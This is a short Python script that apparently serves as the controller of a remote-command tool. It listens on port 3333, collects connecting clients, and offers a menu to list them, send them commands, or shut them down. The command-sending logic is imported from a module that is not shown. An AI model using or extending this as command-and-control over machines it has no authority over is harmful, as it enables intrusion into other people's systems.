from socket import *
from server_menu import menu,get_all_clients,command,shutdown_client
import threading

running = True

def clients_manager(server):
    while running:
        try:
            client, addr = server.accept()
            clients.append([client,addr])
        except OSError:
            break
server = socket(AF_INET, SOCK_STREAM)
server.bind(("",3333))
server.listen(100)

clients = []
t=threading.Thread(target=clients_manager,args=(server,))
t.start()


while running:
    menu()
    try:
        option = int(input("[+] Command > "))
    except:
        print("Enter option number")
        continue
    if option == 1:
        get_all_clients(clients)
    elif option == 2:
        command(clients)
    elif option == 3:
        shutdown_client(clients)
    elif option == 4:
        print("shutting down...")
        running = False
        for client, addr in clients:
            client.close()
        clients.clear()
        server.close()
        t.join()

        exit(4)

